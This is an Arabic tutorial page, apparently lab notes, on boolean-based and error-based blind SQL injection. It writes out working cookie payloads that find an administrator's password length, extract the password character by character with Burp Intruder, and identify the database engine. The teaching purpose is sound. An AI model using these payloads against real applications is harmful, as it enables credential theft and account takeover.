+<h1 id="5">5️⃣ معرفة طول الباسورد</h1>
+<p>الطلب:</p>
+<p>TrackingId=xyz' AND (SELECT 'a' FROM users <br />
+WHERE username='administrator' <br />
+AND LENGTH(password)&gt;1)='a</p>
+<h3 id="_31">تحليل الكود</h3>
+<p>الشرط:</p>
+<p>LENGTH(password) &gt; 1</p>
+<p>أي:</p>
+<p>هل طول الباسورد أكبر من 1؟</p>
+<p>لو True يظهر:</p>
+<p>Welcome back</p>
+<hr />
+<h3 id="_32">نزيد الرقم تدريجياً</h3>
+<p>LENGTH(password)&gt;2<br />
+LENGTH(password)&gt;3<br />
+LENGTH(password)&gt;4</p>
+<p>حتى تختفي الرسالة.</p>
+<p>مثلاً لو:</p>
+<blockquote>
+<p>20 → False<br />
+19 → True</p>
+</blockquote>
+<p>إذن:</p>
+<p>password length = 20</p>
+<hr />
+<h1 id="6-substring">6️⃣ استخراج الحروف باستخدام SUBSTRING</h1>
+<p>الـ payload يصبح:</p>
+<p>TrackingId=xyz' AND <br />
+(SELECT SUBSTRING(password,1,1) <br />
+FROM users WHERE username='administrator')='a</p>
+<h3 id="_33">تحليل الكود</h3>
+<p>SUBSTRING(password,1,1)</p>
+<p>المعنى:</p>
+<p>خذ من password<br />
+الحرف رقم 1<br />
+بطول 1</p>
+<p>مثلاً لو الباسورد:</p>
+<p>secret123</p>
+<p>النتيجة:</p>
+<p>s</p>
+<hr />
+<h3 id="_34">المقارنة</h3>
+<p>'s' = 'a'</p>
+<p>False.</p>
+<p>فنغير الحرف:</p>
+<p>'b'<br />
+'c'<br />
+'d'</p>
+<p>حتى يصبح True.</p>
+<hr />
+<h1 id="7-burp-intruder">7️⃣ استخدام Burp Intruder لتجربة الحروف</h1>
+<p>بدلاً من تجربة كل حرف يدويًا.</p>
+<p>نرسل الطلب إلى:</p>
+<p><strong>Burp Suite → Intruder</strong></p>
+<p>ونضع payload:</p>
+<p>TrackingId=xyz' AND <br />
+(SELECT SUBSTRING(password,1,1) <br />
+FROM users WHERE username='administrator')='§a§</p>
+<p>الرمز:</p>
+<p>§ §</p>
+<p>يعني:</p>
+<p>هذا مكان تغيير الـ payload</p>
+<hr />
+<h1 id="8">8️⃣ تحديد الحروف الممكنة</h1>
+<p>نضع payload list:</p>
+<p>a-z<br />
+0-9</p>
+<p>لأن الباسورد غالباً:</p>
+<p>lowercase alphanumeric</p>
+<hr />
+<h1 id="9">9️⃣ تحديد علامة النجاح</h1>
+<p>في Intruder نضيف:</p>
+<p>Welcome back</p>
+<p>في <strong>Grep - Match</strong></p>
+<p>حتى يعرف Burp متى يكون الشرط True.</p>
+<hr />
+<h1 id="_35">🔟 قراءة النتائج</h1>
+<p>في النتائج سيظهر عمود:</p>
+<p>Welcome back</p>
+<p>وأحد الصفوف سيكون فيه ✔.</p>
+<p>مثلاً:</p>
+<p>payload = s</p>
+<p>إذن:</p>
+<p>first character = s</p>
+<hr />
+<h1 id="11">11️⃣ استخراج باقي الحروف</h1>
+<p>نغير:</p>
+<p>SUBSTRING(password,1,1)</p>
+<p>إلى:</p>
+<p>SUBSTRING(password,2,1)</p>
+<p>ثم:</p>
+<p>3<br />
+4<br />
+5</p>
+<p>حتى:</p>
+<p>20</p>
+<p>لأن طول الباسورد = 20.</p>
+<hr />
+<h1 id="12">12️⃣ النتيجة النهائية</h1>
+<p>بعد استخراج كل الحروف نحصل على:</p>
+<p>password = <strong><em>*</em></strong><strong>*</strong></p>
+<p>ثم تذهب لصفحة login:</p>
+<p>My account</p>
+<p>وتدخل:</p>
+<p>username = administrator<br />
+password = extracted_password</p>
+<p>وبذلك تحل الـ lab 🎯.</p>
+<hr />
+<p>💡 <strong>معلومة مهمة:</strong><br />
+الأداة <strong>sqlmap</strong> تقوم بكل هذه الخطوات تلقائيًا، لكنها في الـ labs الهدف هو فهم المنطق.</p>
+<hr />
+<p>ERROR BASED SQL INJECTION</p>
+<hr />
+<h1 id="concept">الفكرة الأساسية (Concept)</h1>
+<p>في بعض المواقع:</p>
+<ul>
+<li>
+<p>الـ response <strong>لا يتغير</strong> سواء الشرط True أو False</p>
+</li>
+<li>
+<p>مفيش <strong>Welcome back</strong></p>
+</li>
+<li>
+<p>مفيش فرق في HTML</p>
+</li>
+</ul>
+<p>يعني <strong>Boolean Blind SQL Injection</strong> لا يعمل.</p>
+<p>لكن ممكن نعمل حاجة ذكية:</p>
+<p>💡 نجعل الـ <strong>database يعمل Error فقط لو الشرط True</strong></p>
+<p>وبعدها نلاحظ:</p>
+<table>
+<thead>
+<tr>
+<th>الحالة</th>
+<th>نتيجة السيرفر</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>الشرط False</td>
+<td>الصفحة طبيعية</td>
+</tr>
+<tr>
+<td>الشرط True</td>
+<td>يظهر Error</td>
+</tr>
+</tbody>
+</table>
+<p>وبالتالي نعرف نتيجة الشرط.</p>
+<hr />
+<h1 id="payload_2">أول Payload</h1>
+<p>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a</p>
+<p>خلينا نفكها.</p>
+<hr />
+<h1 id="1-sql-query">1️⃣ كسر الـ SQL Query</h1>
+<p>الـ cookie:</p>
+<p>TrackingId=xyz</p>
+<p>غالباً الاستعلام يكون مثل:</p>
+<p>SELECT * FROM tracking<br />
+WHERE TrackingId='xyz'</p>
+<p>بعد الـ injection يصبح:</p>
+<p>SELECT * FROM tracking<br />
+WHERE TrackingId='xyz'<br />
+AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'</p>
+<hr />
+<h1 id="2-case">2️⃣ فهم CASE</h1>
+<p>في SQL عندنا:</p>
+<p>CASE<br />
+WHEN condition<br />
+THEN value1<br />
+ELSE value2<br />
+END</p>
+<p>مثل if statement في البرمجة.</p>
+<p>مثال:</p>
+<p>CASE<br />
+WHEN 5 &gt; 3 THEN 'yes'<br />
+ELSE 'no'<br />
+END</p>
+<p>النتيجة:</p>
+<p>yes</p>
+<hr />
+<h1 id="3">3️⃣ تحليل الكود</h1>
+<p>CASE WHEN (1=2) THEN 1/0 ELSE 'a' END</p>
+<p>نقيم الشرط:</p>
+<p>1=2</p>
+<p>False.</p>
+<p>إذن:</p>
+<p>ELSE 'a'</p>
+<p>النتيجة:</p>
+<p>a</p>
+<hr />
+<h1 id="4">4️⃣ المقارنة</h1>
+<p>الـ query يصبح:</p>
+<p>'a' = 'a'</p>
+<p>True.</p>
+<p>ولا يوجد Error.</p>
+<hr />
+<h1 id="payload_3">Payload الثاني</h1>
+<p>xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a</p>
+<hr />
+<h1 id="_36">تحليل الكود</h1>
+<p>الشرط:</p>
+<p>1 = 1</p>
+<p>True.</p>
+<p>إذن:</p>
+<p>THEN 1/0</p>
+<hr />
+<h1 id="_37">ماذا يحدث هنا؟</h1>
+<p>1/0</p>
+<p>يعني:</p>
+<p>divide by zero</p>
+<p>وهذا يسبب:</p>
+<p>Database error</p>
+<p>مثل:</p>
+<p>division by zero</p>
+<hr />
+<h1 id="_38">ماذا نستفيد؟</h1>
+<p>لو لاحظنا:</p>
+<table>
+<thead>
+<tr>
+<th>الحالة</th>
+<th>النتيجة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>condition False</td>
+<td>الصفحة طبيعية</td>
+</tr>
+<tr>
+<td>condition True</td>
+<td>Error</td>
+</tr>
+</tbody>
+</table>
+<p>إذن يمكننا معرفة نتيجة الشرط.</p>
+<hr />
+<h1 id="_39">استخدام التقنية لاستخراج البيانات</h1>
+<p>الـ Payload يصبح:</p>
+<p>xyz' AND (<br />
+SELECT CASE <br />
+WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm')<br />
+THEN 1/0 <br />
+ELSE 'a' <br />
+END <br />
+FROM Users)='a</p>
+<p>خلينا نشرحه بالتفصيل.</p>
+<hr />
+<h1 id="_40">الجزء الأول</h1>
+<p>SELECT ... FROM Users</p>
+<p>نحن نستعلم من جدول:</p>
+<p>Users</p>
+<hr />
+<h1 id="_41">الشرط</h1>
+<p>Username = 'Administrator'</p>
+<p>يعني:</p>
+<p>اختر صف administrator</p>
+<hr />
+<h1 id="_42">استخراج حرف من الباسورد</h1>
+<p>SUBSTRING(Password, 1, 1)</p>
+<p>المعنى:</p>
+<p>خذ من Password<br />
+الحرف رقم 1<br />
+بطول 1</p>
+<p>مثال:</p>
+<p>password = secret123</p>
+<p>النتيجة:</p>
+<p>s</p>
+<hr />
+<h1 id="_43">المقارنة</h1>
+<p>SUBSTRING(password,1,1) &gt; 'm'</p>
+<p>يعني:</p>
+<p>هل الحرف:</p>
+<p>أكبر من m</p>
+<p>حسب ترتيب ASCII.</p>
+<hr />
+<h1 id="_44">مثال</h1>
+<p>لو الحرف:</p>
+<p>s</p>
+<p>المقارنة:</p>
+<p>s &gt; m</p>
+<p>True.</p>
+<hr />
+<h1 id="_45">ماذا يحدث بعدها؟</h1>
+<p>لو الشرط True:</p>
+<p>THEN 1/0</p>
+<p>إذن:</p>
+<p>Database Error</p>
+<hr />
+<p>لو False:</p>
+<p>ELSE 'a'</p>
+<p>ولا يحدث Error.</p>
+<hr />
+<h1 id="_46">ماذا نستنتج؟</h1>
+<p>من الـ response:</p>
+<table>
+<thead>
+<tr>
+<th>response</th>
+<th>الاستنتاج</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Error</td>
+<td>الحرف &gt; m</td>
+</tr>
+<tr>
+<td>No error</td>
+<td>الحرف ≤ m</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="_47">لماذا هذا مهم؟</h1>
+<p>لأننا نستطيع استخدام <strong>Binary Search</strong> لاستخراج الحرف بسرعة.</p>
+<p>مثلاً:</p>
+<p>بدلاً من تجربة:</p>
+<p>a<br />
+b<br />
+c<br />
+d<br />
+...<br />
+z</p>
+<p>نفعل:</p>
+<blockquote>
+<p>m<br />
+t<br />
+g</p>
+</blockquote>
+<p>حتى نصل للحرف.</p>
+<hr />
+<h1 id="_48">مثال استخراج حرف</h1>
+<p>نبدأ:</p>
+<blockquote>
+<p>m</p>
+</blockquote>
+<p>لو Error:</p>
+<p>الحرف بين n و z</p>
+<p>نجرب:</p>
+<blockquote>
+<p>t</p>
+</blockquote>
+<p>لو False:</p>
+<p>بين n و t</p>
+<p>ثم:</p>
+<blockquote>
+<p>q</p>
+</blockquote>
+<p>وهكذا.</p>
+<hr />
+<h1 id="_49">لماذا هذه الطريقة قوية؟</h1>
+<p>في <strong>Blind SQL Injection</strong> العادي:</p>
+<p>عدد الطلبات للحرف:</p>
+<p>36 request</p>
+<p>لكن باستخدام Binary Search:</p>
+<p>5 requests فقط</p>
+<hr />
+<h1 id="_50">الخلاصة</h1>
+<p>الـ Error-based Blind SQLi يعمل كالتالي:</p>
+<p>1️⃣ نضع شرط<br />
+2️⃣ لو True نسبب <strong>database error</strong><br />
+3️⃣ لو False لا يحدث شيء<br />
+4️⃣ نلاحظ الفرق في HTTP response<br />
+5️⃣ نستخرج البيانات حرفًا حرفًا</p>
+<hr />
+<p>أكواد معرفة نوع ال DB for BLIND SQL INJECTION ERROR BASED:</p>
+<h1 id="mysql-mariadb">MySQL / MariaDB</h1>
+<p>الأكواد الخاصة بـ MySQL:</p>
+<p>database()</p>
+<p>ترجع اسم الداتا بيز الحالية.</p>
+<h3 id="payload_4">Payload</h3>
+<p>TrackingId=xyz' AND (SELECT CASE WHEN (database() IS NOT NULL) THEN 1/0 ELSE 'a' END)='a</p>
+<h3 id="_51">شرح</h3>
+<p>database()</p>
+<p>Function موجودة فقط في MySQL.</p>
+<p>إذا اشتغلت:</p>
+<p>condition = True</p>
+<p>إذن:</p>
+<p>1/0</p>
+<p>→ يحدث <strong>divide by zero error</strong></p>
+<p>إذن الداتا بيز غالبًا:</p>
+<p>MySQL</p>
+<hr />
+<h1 id="2-postgresql">2️⃣ PostgreSQL</h1>
+<p>في PostgreSQL اسم الداتا بيز يحصل عليه بـ:</p>
+<p>current_database()</p>
+<h3 id="payload_5">Payload</h3>
+<p>TrackingId=xyz' AND (SELECT CASE WHEN (current_database() IS NOT NULL) THEN 1/0 ELSE 'a' END)='a</p>
+<h3 id="_52">شرح</h3>
+<p>current_database()</p>
+<p>Function خاصة بـ PostgreSQL.</p>
+<p>لو الشرط True → يحدث Error.</p>
+<p>إذن:</p>
+<p>Database = PostgreSQL</p>
+<hr />
+<h1 id="3-microsoft-sql-server">3️⃣ Microsoft SQL Server</h1>
+<p>في <strong>Microsoft SQL Server</strong> نستخدم:</p>
+<p>DB_NAME()</p>
+<h3 id="payload_6">Payload</h3>
+<p>TrackingId=xyz' AND (SELECT CASE WHEN (DB_NAME() IS NOT NULL) THEN 1/0 ELSE 'a' END)='a</p>
+<h3 id="_53">شرح</h3>
+<p>DB_NAME()</p>
+<p>ترجع اسم الداتا بيز.</p>
+<p>لو اشتغلت → غالبًا SQL Server.</p>
+<hr />
+<h1 id="4-oracle">4️⃣ Oracle</h1>
+<p>في <strong>Oracle Database</strong> يوجد اختلافين مهمين:</p>
+<p>1️⃣ يجب استخدام table في SELECT<br />
+2️⃣ يوجد جدول وهمي اسمه</p>
+<p>dual</p>
+<h3 id="payload_7">Payload</h3>
+<p>TrackingId=xyz'||(SELECT '' FROM dual)||'</p>
+<h3 id="_54">شرح</h3>
+<p>SELECT '' FROM dual</p>
+<p>Oracle يتطلب تحديد table.</p>
+<p>لو اشتغل بدون Error:</p>
+<p>Database = Oracle</p>
+<hr />
+<h1 id="5-sqlite">5️⃣ SQLite</h1>
+<p>في <strong>SQLite</strong> يوجد جدول خاص:</p>
+<p>sqlite_master</p>
+<h3 id="payload_8">Payload</h3>
+<p>TrackingId=xyz' AND (SELECT name FROM sqlite_master LIMIT 1)='a</p>
+<h3 id="_55">شرح</h3>
+<p>sqlite_master</p>
+<p>يحتوي كل الجداول في SQLite.</p>
+<p>لو لم يحدث Syntax Error → غالبًا SQLite.</p>
+<hr />
+<h1 id="_56">الفرق بين قواعد البيانات بسرعة</h1>
+<table>
+<thead>
+<tr>
+<th>Database</th>
+<th>Function مميزة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>database()</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>current_database()</code></td>
+</tr>
+<tr>
+<td>SQL Server</td>
+<td><code>DB_NAME()</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>dual</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>sqlite_master</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="pentesters">طريقة احترافية يستخدمها الـ Pentesters</h1>
+<p>بدلاً من تجربة Functions كثيرة، هناك Payload يكشف نوع DB بسرعة:</p>
+<p>مثلاً:</p>
+<p>'||(SELECT '' FROM dual)||'</p>
+<p>لو نجح → غالبًا Oracle.</p>
+<p>أو:</p>
+<p>AND @@version</p>
+<p>لو نجح → غالبًا SQL Server أو MySQL.</p>
+<hr />
+<p>ERROR BASED SQL INJECTION LABS:</p>
+<hr />
+<p>1-</p>
+<h1 id="sql-injection">اختبار وجود SQL Injection</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'</p>
+<h3 id="_57">ماذا يحدث؟</h3>
+<p>الـ query تصبح:</p>
+<p>SELECT * FROM tracking WHERE TrackingId='xyz''</p>
+<p>هنا حدث:</p>
+<p>Unclosed quote</p>
+<p>يعني:</p>
+<p>SQL syntax error</p>
+<p>فتظهر رسالة خطأ.</p>
+<hr />
+<h1 id="3-quote">3️⃣ اختبار إغلاق الـ quote</h1>
+<p>نجرب:</p>
+<p>TrackingId=xyz''</p>
+<p>الـ query تصبح:</p>
+<p>TrackingId='xyz'''</p>
+<p>هنا تم إغلاق الاقتباس بشكل صحيح لذلك <strong>الـ error يختفي</strong>.</p>
+<p>هذا يدل أن:</p>
+<p>الـ input يدخل داخل SQL query</p>
+<hr />
+<h1 id="4-subquery">4️⃣ إدخال Subquery</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT '')||'</p>
+<h3 id="_58">شرح الرموز</h3>
+<p>||</p>
+<p>في Oracle يعني:</p>
+<p>String concatenation</p>
+<p>مثل:</p>
+<p>"abc" + "def"</p>
+<p>لكن في SQL.</p>
+<hr />
+<h3 id="_59">تحليل الكود</h3>
+<p>xyz' || (SELECT '') || '</p>
+<p>يعني:</p>
+<p>"xyz" + نتيجة الاستعلام + ""</p>
+<p>لكن Oracle يتطلب table في SELECT لذلك يحدث Error.</p>
+<hr />
+<h1 id="5-dual">5️⃣ استخدام جدول dual</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT '' FROM dual)||'</p>
+<h3 id="dual">ما هو dual ؟</h3>
+<p>في <strong>Oracle Database</strong> يوجد جدول وهمي اسمه:</p>
+<p>dual</p>
+<p>يستخدم عندما تريد SELECT بدون جدول حقيقي.</p>
+<p>مثال:</p>
+<p>SELECT 1 FROM dual</p>
+<hr />
+<h3 id="_60">ماذا حدث؟</h3>
+<p>الـ query أصبحت صحيحة.</p>
+<p>لذلك <strong>الخطأ اختفى</strong>.</p>
+<p>وهذا يؤكد أن:</p>
+<p>Database = Oracle</p>
+<hr />
+<h1 id="6-query">6️⃣ اختبار Query غير موجود</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'</p>
+<p>هنا نحاول الاستعلام من جدول غير موجود.</p>
+<p>النتيجة:</p>
+<p>Database error</p>
+<p>وهذا يؤكد أن:</p>
+<p>الـ input يتم تفسيره كـ SQL query</p>
+<hr />
+<h1 id="7-users">7️⃣ اختبار وجود جدول users</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</p>
+<h3 id="_61">شرح</h3>
+<p>users</p>
+<p>جدول نريد معرفة وجوده.</p>
+<hr />
+<h3 id="rownum">ما هو ROWNUM ؟</h3>
+<p>في Oracle لا يوجد:</p>
+<p>LIMIT</p>
+<p>بدل ذلك يستخدم:</p>
+<p>ROWNUM</p>
+<p>مثال:</p>
+<p>ROWNUM = 1</p>
+<p>يعني:</p>
+<p>خذ صف واحد فقط</p>
+<hr />
+<h3 id="_62">لماذا مهم؟</h3>
+<p>لو رجع الاستعلام أكثر من صف:</p>
+<p>String concatenation fails</p>
+<p>لذلك نحدد صف واحد.</p>
+<hr />
+<h3 id="_63">النتيجة</h3>
+<p>لا يوجد Error.</p>
+<p>إذن:</p>
+<p>table users exists</p>
+<hr />
+<h1 id="8-error-based-condition">8️⃣ تنفيذ Error-based condition</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</p>
+<hr />
+<h2 id="case">شرح CASE</h2>
+<p>CASE<br />
+WHEN condition<br />
+THEN value1<br />
+ELSE value2<br />
+END</p>
+<p>مثل:</p>
+<p>if statement</p>
+<hr />
+<h2 id="_64">تحليل الكود</h2>
+<p>1 = 1</p>
+<p>True.</p>
+<p>إذن:</p>
+<p>THEN TO_CHAR(1/0)</p>
+<hr />
+<h3 id="10">ماذا يعني 1/0 ؟</h3>
+<p>Divide by zero</p>
+<p>وهذا يسبب:</p>
+<p>Database error</p>
+<hr />
+<h3 id="to_char">لماذا TO_CHAR ؟</h3>
+<p>لأننا داخل:</p>
+<p>string concatenation</p>
+<p>يجب تحويل الرقم إلى نص.</p>
+<hr />
+<h1 id="9-false-condition">9️⃣ اختبار False condition</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</p>
+<p>هنا:</p>
+<p>1 = 2</p>
+<p>False.</p>
+<p>إذن:</p>
+<p>ELSE ''</p>
+<p>ولا يحدث Error.</p>
+<hr />
+<h3 id="_65">ماذا تعلمنا؟</h3>
+<p>يمكننا:</p>
+<p>إحداث Error فقط إذا كان الشرط True</p>
+<p>وهذا أساس <strong>Error-based SQL Injection</strong>.</p>
+<hr />
+<h1 id="administrator">🔟 اختبار وجود administrator</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</p>
+<h3 id="_66">ماذا يحدث؟</h3>
+<p>لو كان المستخدم موجود:</p>
+<p>query returns row</p>
+<p>إذن الشرط ينفذ:</p>
+<p>1/0</p>
+<p>ويحدث Error.</p>
+<p>إذن:</p>
+<p>administrator exists</p>
+<hr />
+<h1 id="11_1">11️⃣ معرفة طول الباسورد</h1>
+<p>نرسل:</p>
+<p>TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</p>
+<h3 id="length">شرح LENGTH</h3>
+<p>LENGTH(password)</p>
+<p>يعني:</p>
+<p>عدد حروف الباسورد</p>
+<hr />
+<h3 id="_67">الفكرة</h3>
+<p>نجرب:</p>
+<blockquote>
+<p>1<br />
+2<br />
+3<br />
+4</p>
+</blockquote>
+<p>حتى يختفي الـ Error.</p>
+<hr />
+<p>مثال:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Error</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&gt;19</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>&gt;20</td>
+<td>no</td>
+</tr>
+</tbody>
+</table>
+<p>إذن:</p>
+<p>password length = 20</p>
+<hr />
+<h1 id="12_1">12️⃣ استخراج الحروف</h1>
+<p>نستخدم:</p>
+<p>SUBSTR</p>
+<p>payload:</p>
+<p>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</p>
+<hr />
+<h3 id="substr">شرح SUBSTR</h3>
+<p>SUBSTR(text, position, length)</p>
+<p>مثال:</p>
+<p>SUBSTR('secret',1,1)</p>
+<p>النتيجة:</p>
+<p>s</p>
+<hr />
+<h3 id="_68">الفكرة</h3>
+<p>نجرب:</p>
+<p>a<br />
+b<br />
+c<br />
+d<br />
+...<br />
+z<br />
+0<br />
+1<br />
+2<br />
+...<br />
+9</p>
+<p>لو حدث Error → الحرف صحيح.</p>
+<hr />
+<h1 id="13-burp-intruder">13️⃣ استخدام Burp Intruder</h1>
+<p>بدل التجربة اليدوية.</p>
+<p>نضع:</p>
+<p>§a§</p>
+<p>مثل:</p>
+<p>SUBSTR(password,1,1)='§a§'</p>
+<p>هذا يعني:</p>
+<p>payload position</p>
+<hr />
+<h3 id="payload-list">Payload list</h3>
+<p>a-z<br />
+0-9</p>
+<hr />
+<h1 id="14">14️⃣ معرفة الحرف الصحيح</h1>
+<p>النتائج في Intruder:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>a</td>
+<td>200</td>
+</tr>
+<tr>
+<td>b</td>
+<td>200</td>
+</tr>
+<tr>
+<td>s</td>
+<td>500</td>
+</tr>
+</tbody>
+</table>
+<h3 id="500">ماذا يعني 500 ؟</h3>
+<p>HTTP 500</p>
+<p>يعني:</p>
+<p>Server error</p>
+<p>أي حدث:</p>
+<p>1/0</p>
+<p>إذن:</p>
+<p>first character = s</p>
+<hr />
+<h1 id="15">15️⃣ استخراج باقي الحروف</h1>
+<p>نغير:</p>
+<p>SUBSTR(password,1,1)</p>
+<p>إلى:</p>
+<p>SUBSTR(password,2,1)</p>
+<p>ثم:</p>
+<p>3<br />
+4<br />
+5<br />
+...<br />
+20</p>
+<p>حتى نحصل على الباسورد بالكامل.</p>
+<hr />
+<h1 id="16">16️⃣ تسجيل الدخول</h1>
+<p>بعد استخراج الباسورد:</p>
+<p>نذهب إلى:</p>
+<p>My account</p>
+<p>ونسجل الدخول:</p>
+<p>username = administrator<br />
+password = extracted_password</p>
+<p>وبذلك يتم حل اللاب.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u062a\u0645 \u0627\u0644\u0646\u0633\u062e \u0627\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "clipboard.copy": "\u0646\u0633\u062e \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "search.result.more.one": "\u0623\u0643\u062b\u0631 \u0645\u0646 1 \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.more.other": "\u0623\u0643\u062b\u0631 \u0645\u0646 # \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.none": "\u0644\u0627 \u062a\u0648\u062c\u062f \u0646\u062a\u0627\u0626\u062c", "search.result.one": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b \u0645\u0633\u062a\u0646\u062f \u0648\u0627\u062d\u062f", "search.result.other": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b # \u0645\u0633\u062a\u0646\u062f\u0627\u062a", "search.result.placeholder": "\u0627\u0643\u062a\u0628 \u0644\u0628\u062f\u0621 \u0627\u0644\u0628\u062d\u062b", "search.result.term.missing": "\u0645\u0641\u0642\u0648\u062f", "select.version": "\u0625\u062e\u062a\u0631 \u0627\u0644\u0625\u0635\u062f\u0627\u0631"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
